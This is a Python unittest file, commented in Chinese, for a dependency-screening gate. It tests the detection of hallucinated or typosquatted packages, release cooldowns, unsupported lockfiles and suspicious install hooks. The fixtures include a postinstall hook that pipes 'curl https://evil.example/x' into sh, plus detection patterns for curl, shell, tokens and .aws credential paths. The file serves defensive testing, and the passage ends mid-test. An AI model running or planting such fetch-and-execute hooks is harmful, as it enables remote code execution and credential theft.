"""快篩深模組（scripts/g1_screen.py 的 screen 與 Outcome，#266 後半）。

只透過公開介面 screen(Request, Env) -> Outcome、Outcome.unreadable 與四個純函式檢視（to_stdout、to_sarif、
to_gate_run／to_gate_result、result_line），以及由快篩主檔搬來的規則／相似度／允許清單／設定單元契約斷言可觀察行為；
不覆寫任何模組層變數、不連網、不建真 git 庫。
"""
import dataclasses
from datetime import date, datetime, timedelta, timezone
import json
import os
import pathlib
import re
import shutil
import sys
import tempfile
import unittest

from jsonschema import Draft202012Validator
import yaml

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "scripts"))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import g1_git as gg  # noqa: E402
import g1_registry as gr  # noqa: E402
import g1_screen as gs  # noqa: E402
import gate_result  # noqa: E402
from fakes import FakeGit  # noqa: E402
from vibesec_policy import POLICY_UNREADABLE, Policy, temp_policy_root  # noqa: E402

ROOT = pathlib.Path(__file__).resolve().parents[1]
GATE_SCHEMA = Draft202012Validator(json.loads((ROOT / "schemas/gate-result.schema.json").read_text(encoding="utf-8")))
OLD = "2020-01-01T00:00:00Z"


def npm_clean(name="express", ver="4.21.2", downloads=50_000, scripts=None):
    return gr.Found(gr.Facts("npm", name, ver, OLD, {} if scripts is None else scripts, downloads))


def npm_fresh(name="fresh-pkg", ver="1.0.0", days=2, downloads=50_000):
    iso = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    return gr.Found(gr.Facts("npm", name, ver, iso, {}, downloads))


def pypi_clean(name="requests", ver="2.32.0"):
    return gr.Found(gr.Facts("pypi", name, ver, OLD, None, None))


def pypi_fresh(name="requests", ver="2.32.0", days=1):
    iso = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
    return gr.Found(gr.Facts("pypi", name, ver, iso, None, None))


class _ScreenCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.D = pathlib.Path(self._tmp.name).resolve()

    def write(self, rel, text):
        p = self.D / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
        return p

    def env(self, *, registry=None, git=None, this_repo=False, config_root=ROOT, today=date(2026, 10, 1), policy=None, rule_cfg=None):
        pol = policy or Policy(ROOT, project_root=self.D if this_repo else None)
        return gs.build_env(pol, git=git or FakeGit(), registry=registry or gr.FakeRegistry(),
                            config_root=config_root, today=today, rule_cfg=rule_cfg)


class ScreenHappyAndSkip(_ScreenCase):
    def test_empty_scope_returns_frozen_pass_outcome_and_skip_views(self):
        out = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[])))
        self.assertIsInstance(out, gs.Outcome)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            out.exit_code = 99
        self.assertEqual((out.findings, out.problems, out.status, out.scope, out.exit_code), ((), (), "pass", "diff", 0))
        self.assertEqual([c["state"] for c in out.coverage], ["pass", "pass", "pass"])
        self.assertEqual(out.to_stdout(), {"gate": "G1", "findings": [], "target": str(self.D)})
        self.assertEqual(out.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")

    def test_clean_npm_manifest_passes_all_three_controls_and_prints_pass_line(self):
        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
        reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})
        out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)), self.env(registry=reg, this_repo=True))
        self.assertEqual((out.findings, out.problems, out.status, out.scope, out.exit_code), ((), (), "pass", "full", 0))
        self.assertEqual([(c["control_id"], c["state"]) for c in out.coverage], [
            ("VS-G1-SLOPSQUAT", "pass"),
            ("VS-G1-COOLDOWN", "pass"),
            ("VS-G1-INSTALL-HOOK", "pass"),
        ])
        stdout = out.to_stdout()
        self.assertEqual(stdout, {"gate": "G1", "findings": []})
        self.assertEqual(out.result_line(), "\n✅ G1 快篩通過。")

    def test_full_target_scan_discovers_manifests_skips_node_modules_and_prioritizes_blocking_over_unparsed(self):
        self.write("examples/vulnapp/requirements.txt", "requests==2.0.0\n")
        self.write("deploy/python-requirements.txt", "fastapi==0.1.0 \\\n    --hash=sha256:00\n")
        self.write("frontend/yarn.lock", "# yarn lockfile v1\n")
        self.write("README.md", "沒有安裝指令。\n")
        self.write("node_modules/x/package.json", '{"dependencies": {"evil": "1.0.0"}}\n')
        reg = gr.FakeRegistry({
            ("pypi", "requests", "2.0.0"): pypi_fresh("requests", "2.0.0"),
            ("pypi", "fastapi", "0.1.0"): pypi_fresh("fastapi", "0.1.0"),
        })
        git = FakeGit(tracked=[
            "examples/vulnapp/requirements.txt", "deploy/python-requirements.txt",
            "frontend/yarn.lock", "README.md",
        ])
        out = gs.screen(gs.Request(target=self.D), self.env(registry=reg, git=git, this_repo=False))
        pkgs = {f["package"]: f for f in out.findings}
        self.assertEqual(set(pkgs), {"requests", "fastapi"})
        self.assertEqual(pkgs["fastapi"]["manifest"], "deploy/python-requirements.txt")
        self.assertEqual((out.status, out.exit_code), ("fail", 1))
        self.assertTrue(any("frontend/yarn.lock" in p for p in out.problems))
        stdout_doc = out.to_stdout()
        self.assertIn("frontend/yarn.lock", stdout_doc.get("status_reason") or "")
        self.assertTrue(any("frontend/yarn.lock" in x for x in (stdout_doc.get("incomplete_checks") or ())))


class ScreenUnsupportedEcosystems(_ScreenCase):
    """#316：npm／PyPI 以外生態系的慣例清單 → 未完成原因、三個控制 untested、G1 incomplete（不是 pass）；
    full 掃描時受驗樹沒有任何已知清單 → 三個控制 not_applicable（不是 pass）；diff 模式沒改到清單 → 維持 pass。"""
    UNSUPPORTED = "生態系尚未支援，其中的套件未檢查："

    def test_go_and_cargo_only_full_scan_is_incomplete_not_pass(self):
        self.write("go.mod", "module x\n\ngo 1.22\n\nrequire github.com/nonexistent-zzz/hallucinated-pkg v1.0.0\n")
        self.write("Cargo.toml", '[package]\nname="x"\nversion="0.1.0"\n\n[dependencies]\nhallucinated-zzz = "9.9.9"\n')
        git = FakeGit(tracked=["Cargo.toml", "go.mod"])
        out = gs.screen(gs.Request(target=self.D), self.env(git=git))
        self.assertEqual((out.status, out.exit_code), ("incomplete", 2))
        # 只有這一則原因：不支援的清單不交給 npm／PyPI 的解析器（不會多出「沒有對應的解析器」的通用原因）
        self.assertEqual(out.problems, (self.UNSUPPORTED + "rust（Cargo.toml）、go（go.mod）",))   # 照路徑排序
        self.assertEqual([(c["control_id"], c["state"]) for c in out.coverage],
                         [("VS-G1-SLOPSQUAT", "untested"), ("VS-G1-COOLDOWN", "untested"), ("VS-G1-INSTALL-HOOK", "untested")])
        self.assertIn("go（go.mod）", out.to_stdout().get("status_reason") or "")
        self.assertIn("incomplete", out.result_line())

    def test_unsupported_in_subdirectory_is_listed_with_relative_path(self):
        self.write("services/api/go.mod", "module x\n")
        out = gs.screen(gs.Request(target=self.D), self.env(git=FakeGit(tracked=["services/api/go.mod"])))
        self.assertIn(self.UNSUPPORTED + "go（services/api/go.mod）", out.problems)

    def test_mixed_project_still_checks_npm_and_blocking_wins_over_incomplete(self):
        self.write("package.json", '{"dependencies": {"totally-nonexistent-pkg": "1.0.0"}}\n')
        self.write("go.mod", "module x\n")
        reg = gr.FakeRegistry({("npm", "totally-nonexistent-pkg", "1.0.0"): gr.NotFound()})
        out = gs.screen(gs.Request(target=self.D), self.env(registry=reg, git=FakeGit(tracked=["go.mod", "package.json"])))
        self.assertIn("vibesec.g1.hallucinated-package", {f["rule_id"] for f in out.findings})
        self.assertEqual((out.status, out.exit_code), ("fail", 1))
        self.assertIn(self.UNSUPPORTED + "go（go.mod）", out.problems)

    def test_diff_mode_only_looks_at_changed_files(self):
        self.write("go.mod", "module x\n")
        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
        lst = self.write("changed.txt", "go.mod\n")
        git = FakeGit(tracked=["go.mod", "package.json"])
        out = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),)), self.env(git=git))
        self.assertEqual(out.status, "incomplete")
        self.assertIn(self.UNSUPPORTED + "go（go.mod）", out.problems)
        lst.write_text("package.json\n", encoding="utf-8")
        reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})
        out = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),)), self.env(registry=reg, git=git))
        self.assertFalse(any(self.UNSUPPORTED in p for p in out.problems), out.problems)
        self.assertEqual(out.status, "pass")
        self.write("src/main.c", "int main(void) { return 0; }\n")
        lst.write_text("src/main.c\n", encoding="utf-8")   # 不是清單也不是規則檔
        out = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),)), self.env(git=git))
        self.assertEqual((out.status, [c["state"] for c in out.coverage]), ("pass", ["pass", "pass", "pass"]))
        self.assertEqual(out.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")

    def test_diff_mode_lists_unsupported_in_path_order_regardless_of_changed_list_order(self):
        self.write("go.mod", "module x\n"); self.write("Cargo.toml", "[package]\nname = \"x\"\n")
        lst = self.write("changed.txt", "go.mod\nCargo.toml\n")
        out = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),)), self.env(git=FakeGit(tracked=["Cargo.toml", "go.mod"])))
        self.assertEqual(out.problems, (self.UNSUPPORTED + "rust（Cargo.toml）、go（go.mod）",))

    def test_full_scan_with_other_problem_is_untested_not_not_applicable(self):
        # 沒有任何清單，但指定的檔案不存在（未完成原因）→ 三個控制 untested，not_applicable 不得蓋過未完成原因
        out = gs.screen(gs.Request(target=self.D, manifests=("missing/package.json",)), self.env())
        self.assertEqual((out.scope, out.status), ("full", "incomplete"))
        self.assertEqual([c["state"] for c in out.coverage], ["untested"] * 3)

    def test_full_scan_without_any_known_manifest_is_not_applicable(self):
        self.write("src/main.c", "int main(void) { return 0; }\n")   # 不是清單也不是規則檔（README.md 會被當成規則檔）
        out = gs.screen(gs.Request(target=self.D), self.env(git=FakeGit(tracked=["src/main.c"])))
        self.assertEqual((out.status, out.exit_code, out.problems), ("pass", 0, ()))
        self.assertEqual([(c["state"], c["reason"]) for c in out.coverage],
                         [("not_applicable", "受驗樹沒有任何已知的相依清單")] * 3)
        GATE_SCHEMA.validate(out.to_gate_run())


class ScreenDetectionsAndIndirect(_ScreenCase):
    def test_npm_lockfile_v3_checks_similarity_only_on_direct_deps_and_reports_non_registry_entries(self):
        reg_url = lambda n, v: f"https://registry.npmjs.org/{n}/-/{n.split('/')[-1]}-{v}.tgz"  # noqa: E731
        lock = {"lockfileVersion": 3, "packages": {
            "": {"dependencies": {"playwrigth": "1.0.0", "strip-cjs": "npm:strip-ansi@6.0.1"}},
            "node_modules/playwrigth": {"version": "1.0.0", "resolved": reg_url("playwrigth", "1.0.0")},
            "node_modules/playwright-core": {"version": "1.63.0", "resolved": reg_url("playwright-core", "1.63.0")},
            "node_modules/loadsh": {"version": "0.0.4", "resolved": reg_url("loadsh", "0.0.4")},
            "node_modules/strip-cjs": {"name": "strip-ansi", "version": "6.0.1", "resolved": reg_url("strip-ansi", "6.0.1")},
            "node_modules/a/node_modules/strip-ansi": {"version": "6.0.1", "resolved": reg_url("strip-ansi", "6.0.1")},
            "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/gitdep.git#abc"},
            "node_modules/ws-local": {"resolved": "packages/ws-local", "link": True},
            "packages/ws-local": {"version": "0.1.0"},
        }}
        self.write("web/package-lock.json", json.dumps(lock))
        reg = gr.FakeRegistry({
            ("npm", "playwrigth", "1.0.0"): npm_clean("playwrigth", "1.0.0"),
            ("npm", "playwright-core", "1.63.0"): npm_clean("playwright-core", "1.63.0"),
            ("npm", "loadsh", "0.0.4"): npm_clean("loadsh", "0.0.4"),
            ("npm", "strip-ansi", "6.0.1"): npm_clean("strip-ansi", "6.0.1"),
        })
        out = gs.screen(gs.Request(target=self.D, manifests=("web/package-lock.json",)), self.env(registry=reg))
        hall = {f["package"] for f in out.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"}
        self.assertEqual(hall, {"playwrigth", "loadsh"}, "直接相依做名稱相似度、間接相依仍查黑名單")
        self.assertEqual(sorted(reg.calls), [
            ("npm", "loadsh", "0.0.4"),
            ("npm", "playwright-core", "1.63.0"),
            ("npm", "playwrigth", "1.0.0"),
            ("npm", "strip-ansi", "6.0.1"),
        ])
        self.assertEqual((out.status, out.exit_code), ("fail", 1), "blocking 優先於未完成原因")
        self.assertTrue(any("node_modules/gitdep" in p for p in out.problems))
        stdout_lock = out.to_stdout()
        self.assertIn("node_modules/gitdep", stdout_lock.get("status_reason") or "")
        self.assertTrue(any("node_modules/gitdep" in x for x in (stdout_lock.get("incomplete_checks") or ())))

    def test_requirements_lock_skips_fuzzy_similarity_for_indirect_deps_but_falls_back_to_direct_when_unknown(self):
        self.write("py/requirements.lock.txt",
                   "openai==2.0.0 \\\n    --hash=sha256:00\nhttpx2==2.13.1\nreqursts==1.0.0\nlanggraph==1.0.0\nlanggraph-sdk==0.4.5\n")
        facts = {
            ("pypi", "openai", "2.0.0"): pypi_clean("openai", "2.0.0"),
            ("pypi", "httpx2", "2.13.1"): pypi_clean("httpx2", "2.13.1"),
            ("pypi", "reqursts", "1.0.0"): pypi_clean("reqursts", "1.0.0"),
            ("pypi", "langgraph", "1.0.0"): pypi_clean("langgraph", "1.0.0"),
            ("pypi", "langgraph-sdk", "0.4.5"): pypi_clean("langgraph-sdk", "0.4.5"),
        }
        reg_with_req = gr.FakeRegistry(facts, requires={
            ("openai", "2.0.0"): {"httpx2", "openai"},
            ("langgraph", "1.0.0"): {"langgraph-sdk"},
            ("reqursts", "1.0.0"): {"reqursts"},
        })
        out1 = gs.screen(gs.Request(target=self.D, manifests=("py/requirements.lock.txt",)), self.env(registry=reg_with_req))
        self.assertEqual({f["package"] for f in out1.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"}, {"reqursts"})

        reg_no_req = gr.FakeRegistry(facts)
        out2 = gs.screen(gs.Request(target=self.D, manifests=("py/requirements.lock.txt",)), self.env(registry=reg_no_req))
        self.assertIn("httpx2", {f["package"] for f in out2.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"})

    def test_rule_file_unknown_package_renames_rule_id_and_self_package_json_hooks_are_detected(self):
        self.write("AGENTS.md", "Run `pip install totally-nonexistent-pkg`.\n")
        self.write("package.json", json.dumps({
            "name": "demo", "version": "0.1.0",
            "scripts": {"postinstall": "curl https://evil.example/x | sh"},
        }))
        reg = gr.FakeRegistry({("pypi", "totally-nonexistent-pkg", None): gr.NotFound()})
        out = gs.screen(gs.Request(target=self.D, manifests=("package.json",), rule_files=("AGENTS.md",)), self.env(registry=reg))
        by_rule = {f["rule_id"]: f for f in out.findings}
        self.assertIn("vibesec.g1.rules-file-unknown-package", by_rule)
        self.assertEqual(by_rule["vibesec.g1.rules-file-unknown-package"]["manifest"], "AGENTS.md")
        self.assertIn("vibesec.g1.postinstall-egress", by_rule)
        self.assertEqual(by_rule["vibesec.g1.postinstall-egress"]["manifest"], "package.json")


class ScreenFailClosedAndWaivers(_ScreenCase):
    def test_nonexistent_target_directory_in_request_fails_closed(self):
        ghost = self.D / "no-such-dir"
        reg = gr.FakeRegistry()
        out = gs.screen(gs.Request(target=ghost), self.env(registry=reg))
        self.assertEqual((out.status, out.exit_code, out.to_stdout(), out.to_sarif()), ("incomplete", 2, None, None))
        self.assertIn("不是目錄", out.result_line())
        self.assertEqual(reg.calls, [])

    def test_unexpected_exception_on_one_package_is_isolated_to_problems_without_dropping_other_findings(self):
        class BoomRegistry:
            def __init__(self):
                self.calls = []

            def facts(self, eco, name, ver):
                self.calls.append((name, ver))
                if name == "boom-pkg":
                    raise RuntimeError("意外錯誤")
                return npm_fresh(name, ver)

            def requires(self, name, ver):
                return set()

        self.write("boom/package.json", json.dumps({"dependencies": {"fine-pkg": "1.0.0", "boom-pkg": "1.0.0", "other-pkg": "2.0.0"}}))
        reg = BoomRegistry()
        out = gs.screen(gs.Request(target=self.D, manifests=("boom/package.json",)), self.env(registry=reg))
        self.assertEqual(sorted(reg.calls), [("boom-pkg", "1.0.0"), ("fine-pkg", "1.0.0"), ("other-pkg", "2.0.0")])
        self.assertEqual({f["package"] for f in out.findings}, {"fine-pkg", "other-pkg"})
        self.assertTrue(any("boom-pkg" in p and "RuntimeError" in p for p in out.problems))
        self.assertEqual((out.status, out.exit_code), ("fail", 1))

    def test_unparsed_lockfile_is_recorded_as_problem_and_never_passes(self):
        self.write("frontend/yarn.lock", "# yarn lockfile v1\n")
        out = gs.screen(gs.Request(target=self.D, manifests=("frontend/yarn.lock",)), self.env())
        self.assertEqual((out.status, out.exit_code), ("incomplete", 2))
        self.assertTrue(any("frontend/yarn.lock" in p for p in out.problems))
        self.assertEqual(out.result_line(), "\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。")

    def test_changed_bun_pdm_or_pylock_lockfiles_make_screen_incomplete_and_list_filename(self):
        for rel in ("bun.lock", "sub/bun.lockb", "pdm.lock", "pylock.toml", "locks/pylock.dev.toml"):
            with self.subTest(changed=rel):
                self.write(rel, "# lock\n")
                out = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[rel])))
                self.assertEqual((out.status, out.exit_code, out.scope), ("incomplete", 2, "diff"))
                self.assertTrue(any(rel in p for p in out.problems), out.problems)
                self.assertIn(rel, out.status_reason or "")
                stdout_doc = out.to_stdout() or {}
                self.assertTrue(any(rel in x for x in (stdout_doc.get("incomplete_checks") or ())), stdout_doc)
                gate_doc = out.to_gate_run("2026-11-21T00:00:00+00:00", "abcdef1")
                self.assertIn(rel, gate_doc.get("status_reason") or "")
                self.assertEqual(out.result_line(), "\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。")

        for rel in ("not-bun.lock", "my-pdm.lock", "pylock-foo.toml", "src/main.py"):
            with self.subTest(unchanged_other=rel):
                self.write(rel, "# other\n")
                out = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[rel])))
                self.assertEqual((out.status, out.exit_code, out.problems), ("pass", 0, ()))
                self.assertEqual(out.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")

        # 二進位 bun.lockb 搭配 --changed-files + --base：修改時回 incomplete（不因 surrogate 字元崩潰）；刪除時正常略過並註記
        raw_lockb = b"bun-lockfile\x00\xff\xfe".decode("utf-8", "surrogateescape")
        lst = self.write("changed.txt", "bun.lockb\n")
        (self.D / "bun.lockb").write_bytes(b"bun-lockfile\x00\xff\x01")
        try:
            out_mod = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),), base="base123"),
                                self.env(git=FakeGit(files={("base123", "bun.lockb"): raw_lockb})))
        except UnicodeEncodeError as e:
            self.fail(f"二進位 bun.lockb 搭配 --base 不得崩潰：{e}")
        self.assertEqual((out_mod.status, out_mod.exit_code), ("incomplete", 2))
        self.assertTrue(any("bun.lockb" in p for p in out_mod.problems))

        (self.D / "bun.lockb").unlink()
        out_del = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),), base="base123"),
                            self.env(git=FakeGit(files={("base123", "bun.lockb"): raw_lockb})))
        self.assertEqual((out_del.status, out_del.exit_code, out_del.problems), ("pass", 0, ()))
        self.assertTrue(any("bun.lockb" in n for n in out_del.notes), out_del.notes)

    def test_broken_or_missing_slopsquat_configs_fail_closed(self):
        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
        reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})
        cases = [
            ("完整設定", None, None),
            ("cooldown.yaml 缺席", "cooldown.yaml", None),
            ("cooldown.yaml 語法錯誤", "cooldown.yaml", "thresholds: [\n"),
            ("cooldown.yaml 不是 mapping", "cooldown.yaml", "- a\n"),
            ("blacklist.yaml 缺席", "blacklist.yaml", None),
            ("blacklist.yaml 語法錯誤", "blacklist.yaml", "packages: {\n"),
            ("blacklist.yaml 不是 mapping 或清單", "blacklist.yaml", "just-a-string\n"),
            ("popular-npm.txt 缺席", "popular-npm.txt", None),
            ("popular-pypi.txt 缺席", "popular-pypi.txt", None),
            ("vibesec.yaml 缺席", "vibesec.yaml", None),
            ("vibesec.yaml 語法錯誤", "vibesec.yaml", "gates: [\n"),
        ]
        for label, broken, content in cases:
            with self.subTest(case=label), tempfile.TemporaryDirectory() as cfg_tmp:
                C = pathlib.Path(cfg_tmp)
                shutil.copytree(ROOT / "config/slopsquat", C / "config/slopsquat")
                shutil.copy(ROOT / "vibesec.yaml", C / "vibesec.yaml")
                (C / "config/slopsquat/allowlist.yaml").write_text("version: 1\nentries: []\n", encoding="utf-8")
                if broken:
                    bp = C / "vibesec.yaml" if broken == "vibesec.yaml" else C / "config/slopsquat" / broken
                    bp.unlink()
                    if content is not None:
                        bp.write_text(content, encoding="utf-8")
                out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
                                self.env(registry=reg, config_root=C, this_repo=True))
                if broken is None:
                    self.assertEqual((out.status, out.exit_code), ("pass", 0))
                else:
                    self.assertEqual((out.status, out.exit_code), ("incomplete", 2))
                    self.assertTrue(any(broken in p for p in out.problems), (label, out.problems))
                    self.assertTrue(any(broken in x for x in (out.to_stdout().get("incomplete_checks") or ())), (label, out.to_stdout()))

    def test_allowlist_and_policy_exceptions_lower_tier_with_proper_scope_and_pypi_hook_stays_untested(self):
        with temp_policy_root() as PR, tempfile.TemporaryDirectory() as cr_dir:
            CR = pathlib.Path(cr_dir).resolve()
            pol = yaml.safe_load((PR / "config/policy/blocking-policy.yaml").read_text(encoding="utf-8"))
            pol["exceptions"] = [
                {"rule_id": "vibesec.g1.cooldown-violation", "path_glob": "examples/vulnapp/**",
                 "reason": "selftest", "approved_by": "selftest", "expires": "2099-12-31"},
                {"rule_id": "vibesec.g1.cooldown-violation", "path_glob": "nowhere/**",
                 "reason": "selftest", "approved_by": "selftest", "expires": "2020-01-01"},
                {"rule_id": "vibesec.g2.hardcoded-secret", "path_glob": "nowhere/**",
                 "reason": "selftest", "approved_by": "selftest", "expires": "2020-01-01"},
            ]
            (PR / "config/policy/blocking-policy.yaml").write_text(yaml.safe_dump(pol, allow_unicode=True), encoding="utf-8")
            shutil.copytree(ROOT / "config/slopsquat", CR / "config/slopsquat")
            shutil.copy(ROOT / "vibesec.yaml", CR / "vibesec.yaml")
            (CR / "config/slopsquat/allowlist.yaml").write_text(yaml.safe_dump({"version": 1, "entries": [
                {"package": "fastapi", "ecosystem": "pypi", "version": "0.1.0", "bypass": ["cooldown"],
                 "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"},
            ]}), encoding="utf-8")

            self.write("examples/vulnapp/requirements.txt", "requests==2.0.0\n")
            self.write("deploy/python-requirements.txt", "fastapi==0.1.0\n")
            reg = gr.FakeRegistry({
                ("pypi", "requests", "2.0.0"): pypi_fresh("requests", "2.0.0"),
                ("pypi", "fastapi", "0.1.0"): pypi_fresh("fastapi", "0.1.0"),
            })

            # 本機形狀（project_root=None，受驗樹等於 Policy.root，舊 #43）與 CI 形狀（project_root=self.D，舊 #47）皆視為本 repo
            want_ex = {"path_glob": "examples/vulnapp/**", "reason": "selftest", "approved_by": "selftest",
                       "expires": "2099-12-31", "agent_id": None}
            pr_req = PR / "examples/vulnapp/requirements.txt"
            pr_req.parent.mkdir(parents=True, exist_ok=True)
            pr_req.write_text("requests==2.0.0\n", encoding="utf-8")
            env_local = self.env(registry=reg, config_root=CR, policy=Policy(PR, project_root=None))
            out_local = gs.screen(gs.Request(target=PR, manifests=("examples/vulnapp/requirements.txt",)), env_local)
            self.assertEqual(out_local.findings[0].get("policy_tier"), "advisory")
            self.assertEqual(out_local.findings[0].get("exception"), want_ex)
            self.assertNotIn("target", out_local.to_stdout())

            # CI 形狀（project_root=self.D）：例外套用、allowlist 套件仍查登錄庫、stdout 無 target、gate status_reason 只列 G1 忽略的例外
            env_self = self.env(registry=reg, config_root=CR, policy=Policy(PR, project_root=self.D))
            out_self = gs.screen(gs.Request(target=self.D, manifests=("examples/vulnapp/requirements.txt", "deploy/python-requirements.txt")), env_self)
            self.assertIn(("pypi", "fastapi", "0.1.0"), reg.calls)
            self.assertTrue(all(f["policy_tier"] == "advisory" for f in out_self.findings))
            self.assertEqual((out_self.status, out_self.exit_code), ("incomplete", 2), "PyPI 安裝腳本未檢查 → incomplete")
            self.assertTrue(out_self.result_line().startswith("\n⚠️ G1 有控制未實測 → incomplete，絕不視為通過：VS-G1-INSTALL-HOOK"))
            stdout_self = out_self.to_stdout()
            self.assertNotIn("target", stdout_self)
            self.assertEqual(stdout_self.get("status"), "incomplete")
            self.assertIn("VS-G1-INSTALL-HOOK", stdout_self.get("status_reason") or "")
            self.assertEqual(stdout_self.get("ignored_exceptions"), [
                "vibesec.g1.cooldown-violation @ nowhere/**：已於 2020-01-01 過期",
                "vibesec.g2.hardcoded-secret @ nowhere/**：已於 2020-01-01 過期",
            ])
            gate_self = out_self.to_gate_run("2026-11-19T00:00:00+00:00", "abcdef1")
            self.assertEqual(list(GATE_SCHEMA.iter_errors(gate_self)), [])
            self.assertEqual(gate_self.get("status"), "incomplete")
            self.assertIn("VS-G1-INSTALL-HOOK", gate_self.get("status_reason") or "")
            hook_cov = next(c for c in gate_self["coverage"] if c["control_id"] == "VS-G1-INSTALL-HOOK")
            self.assertEqual(hook_cov["state"], "untested")
            self.assertIn("1 筆命中 blocking-policy 例外（blocking 降為 advisory，發現保留）", gate_self.get("status_reason") or "")
            self.assertIn("vibesec.g1.cooldown-violation @ nowhere/**", gate_self.get("status_reason") or "")
            self.assertNotIn("hardcoded-secret", gate_self.get("status_reason") or "")
            self.assertEqual(out_self.findings[0].get("exception"), want_ex)
            sarif_results = out_self.to_sarif()["runs"][0]["results"]
            self.assertEqual(sarif_results[0]["properties"].get("exception"), want_ex)
            self.assertEqual(sarif_results[1]["properties"].get("allowlist"), {
                "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest", "bypass": "cooldown",
            })

            # 外部專案（project_root=None，受驗樹 self.D != Policy.root）：本 repo 例外不套用，requests 維持 blocking → fail（exit 1）
            env_ext = self.env(registry=reg, config_root=CR, policy=Policy(PR, project_root=None))
            out_ext = gs.screen(gs.Request(target=self.D, manifests=("examples/vulnapp/requirements.txt",)), env_ext)
            self.assertEqual((out_ext.status, out_ext.exit_code), ("fail", 1))
            self.assertEqual(out_ext.findings[0]["policy_tier"], "blocking")
            self.assertNotIn("exception", out_ext.findings[0])
            self.assertIn("exceptions", out_ext.status_reason or "")
            self.assertIn("未套用", out_ext.status_reason or "")
            gate_ext = out_ext.to_gate_run("2026-11-19T00:00:00+00:00", "abcdef1")
            self.assertEqual((gate_ext.get("status"), gate_ext.get("scope")), ("fail", "full"))
            self.assertIn("exceptions", gate_ext.get("status_reason") or "")
            self.assertIn("未套用", gate_ext.get("status_reason") or "")


class MovedSelftestUnits(unittest.TestCase):
    """由 scripts/g1_slopcheck.py selftest 搬來的內部規則單元測試（#260 舊案例 → 新測試對照）。"""

    def setUp(self):
        self.env = gs.build_env(Policy(ROOT, project_root=None), git=FakeGit(), registry=gr.FakeRegistry())

    def test_similarity_pep503_edit_distance_and_homoglyphs(self):
        c = {"similarity": 0.80}
        for name in ("typing_extensions", "Typing.Extensions", "TYPING-extensions"):
            self.assertIsNone(gs.similarity_check(self.env, name, "pypi", {"typing-extensions"}, {}, c))
        self.assertIsNotNone(gs.similarity_check(self.env, "typing-extensionz", "pypi", {"typing-extensions"}, {}, c))
        self.assertIsNotNone(gs.similarity_check(self.env, "left_pad", "npm", {"left-pad"}, {}, c))

        strict = {"similarity": 0.99}
        for name, good, want in (("axois", "axios", True), ("numpyy", "numpy", True), ("pnadsa", "pandas", True),
                                 ("zipp", "pip", False), ("hpack", "black", False), ("pyrit", "pyjwt", False)):
            self.assertEqual(bool(gs.similarity_check(self.env, name, "pypi", {good}, {}, strict)), want, (name, good))

        for name, good, want in (("m1cr0s0ft", "microsoft", True), ("0rac1e", "oracle", True),
                                 ("leftpad", "left-pad", True), ("requests", "requests", False), ("flask", "django", False)):
            eco = "npm" if good == "left-pad" else "pypi"
            self.assertEqual(bool(gs.similarity_check(self.env, name, eco, {good}, {}, strict)), want, (name, good))

    def test_install_hook_prepare_decision_and_self_hooks(self):
        pat = {"network": [r"curl"], "exec": [r"\bsh\b"], "env_read": [r"TOKEN"], "credential_paths": [r"\.aws"], "ai_cli_abuse": []}
        dec = {"any_network_and_exec": "block", "exec_only": "advisory"}
        with tempfile.TemporaryDirectory() as d:
            D = pathlib.Path(d).resolve()
            CR = D / "cfg"
            shutil.copytree(ROOT / "config/slopsquat", CR / "config/slopsquat")
            shutil.copy(ROOT / "vibesec.yaml", CR / "vibesec.yaml")
            base_cd = yaml.safe_load((CR / "config/slopsquat/cooldown.yaml").read_text(encoding="utf-8"))

            def screen_pkg(scripts, npm_scripts, decision):
                cd = dict(base_cd, install_hooks={"suspicious_patterns": pat, "npm_scripts": npm_scripts, "decision": decision})
                (CR / "config/slopsquat/cooldown.yaml").write_text(yaml.safe_dump(cd, allow_unicode=True), encoding="utf-8")
                proj = D / "proj"
                proj.mkdir(exist_ok=True)
                (proj / "package.json").write_text(json.dumps({"dependencies": {"fixture-pkg": "1.0.0"}}), encoding="utf-8")
                reg = gr.FakeRegistry({("npm", "fixture-pkg", "1.0.0"): npm_clean("fixture-pkg", "1.0.0", scripts=scripts)})
                env = gs.build_env(Policy(ROOT, project_root=None), git=FakeGit(), registry=reg, config_root=CR)
                return gs.screen(gs.Request(target=proj, manifests=("package.json",)), env).findings

            fp = screen_pkg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall", "prepare"], dec)
